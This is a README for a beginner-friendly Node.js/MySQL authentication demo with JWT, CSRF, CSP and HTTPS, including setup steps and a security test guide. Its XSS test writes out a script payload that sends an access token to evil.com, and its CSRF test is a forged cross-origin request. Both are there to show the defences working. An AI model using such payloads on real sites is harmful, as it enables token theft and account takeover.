# Secure Auth System (Node.js + MySQL + JWT + CSRF + HTTPS)

A full-stack secure authentication and CRUD system using:

- Node.js (Express)
- MySQL (via XAMPP)
- JWT (Access + Refresh Tokens)
- Double Submit Cookie CSRF Protection
- HTTPS (via mkcert)
- Secure HTTP-only Cookies
- CSP Headers
- SweetAlert, Bootstrap UI
- Token Expiry Countdown
- Full Security Test Guide

---

## Project Structure
```text
secure-auth-system-nodejs/
│
├── backend/
│   ├── .env               # Environment variables (DB + secrets)
│   ├── server.js          # Express HTTPS server
│   ├── db.js              # MySQL DB connection
│   ├── auth.js            # JWT token generators
│   └── package.json       # Dependencies (express, mysql2, bcrypt, etc.)
│
├── certs/
│   ├── cert.pem           # HTTPS cert (mkcert)
│   └── key.pem            # HTTPS private key (mkcert)
│
├── frontend/
│   ├── index.html         # UI: login, dashboard, product CRUD
│   ├── script.js          # Logic: token flow, UI updates
│   └── secure_auth.sql    # SQL: Create DB, tables, sample data
```

---

## 1. Prerequisites

- Node.js & npm installed
- MySQL (use XAMPP or standalone)
- mkcert to generate local HTTPS certificates
- http-server for frontend serving over HTTPS

---

## 2. Setup Backend

### Install Dependencies

```bash
cd backend/
npm install
```

.env Template
Create backend/.env:
```
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=
DB_NAME=secure_auth
ACCESS_TOKEN_SECRET=access_secret_example
REFRESH_TOKEN_SECRET=refresh_secret_example
```

---

## 3. Setup Database
Open XAMPP → Start MySQL

Import SQL file via phpMyAdmin or CLI:
- Use frontend/secure_auth.sql

This creates:

- users table (with hashed password)
- products table (sample products)

---

## Default Credentials

- Username: `admin`
- Password: `123456`

Use these credentials to log in after initial setup. Change them in the database for production use.

---

## 4. Generate HTTPS Certificates

Install mkcert
On Windows (via Chocolatey):
```
choco install mkcert
```
On macOS:
```
brew install mkcert
brew install nss  # Firefox support
```
Then run:

Create Certificates
From the project root:
```
mkdir certs
mkcert -key-file ./certs/key.pem -cert-file ./certs/cert.pem localhost 127.0.0.1
```

---

## 5. Start Backend Server (HTTPS)
```
cd backend/
node server.js
```
Server runs at: https://localhost:3007

---

## 6. Open Frontend (HTTPS)
Serve frontend via HTTPS using http-server
```
npm install -g http-server
```
From inside the frontend/ folder:
```
http-server -S -C ../certs/cert.pem -K ../certs/key.pem -p 5500
```
Visit in browser:
https://127.0.0.1:5500/

Fully secure HTTPS for both frontend and backend.

---

## 7. Security Layers Implemented

| Layer               | Description                                                      |
| ------------------- | ---------------------------------------------------------------- |
| JWT                 | Access (20s) + Refresh (60s) via HTTP-only cookies               |
| CSRF                | Double Submit Cookie pattern with custom header (x-csrf-token)    |
| CSP                 | Content-Security-Policy: blocks inline scripts, external origins  |
| XSS Protection      | CSP + no inline JS + no eval()                                   |
| SameSite=Strict     | Prevents cross-site cookies from being sent unintentionally      |

---

## 8. Simulate Security Tests

1. Unauthorized Access
```
curl -X GET https://localhost:3007/products
# Should return 401 (no token)
```

2. Access Token Expiry
Wait 20s after login

Try CRUD action

It will auto-refresh via /refresh and retry the request

3. Refresh Token Expiry
Wait 60s after login

Try any request

Session expires

You’re logged out automatically

4. CSRF Test
Try running this in browser console (not your app tab):
```js
fetch('https://localhost:3007/products', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'x-csrf-token': 'fake-token'
  },
  body: JSON.stringify({ name: 'MaliciousProduct', price: 0 })
});
```
Should return 403 Forbidden (invalid CSRF token)

5. XSS Simulation
Try injecting script in product name:
```html
<script>fetch('https://evil.com?token=' + localStorage.getItem('access_token'))</script>
```
Will not work:

- No localStorage tokens
- CSP blocks inline JS

---

## 9. Features

- Secure login with hashed passwords (bcrypt)
- Fully HTTPS secured with trusted certs
- Auto token refresh logic with countdown timers
- SweetAlert feedback for users
- CSP headers to prevent inline/injected scripts
- Ready-to-use with minimum setup

---

## 10. Testing Tips

- Use Chrome/Firefox in incognito mode
- Watch browser DevTools → Application → Cookies
- Use console.log to trace token and CSRF logic
- Try simulating attacker behavior in separate tabs or domains

---

## 11. Possible Enhancements

- Server-side CSRF token storage (more secure)
- Token revocation (blacklist DB)
- Role-based authorization
- User registration UI
- Rate limiting

---

## License
MIT License – Free to use, modify, and share.

---

## Author
Built by Nabeel Abbasi with a focus on API security and beginner-friendly demos.
Star the repo if you found it useful.
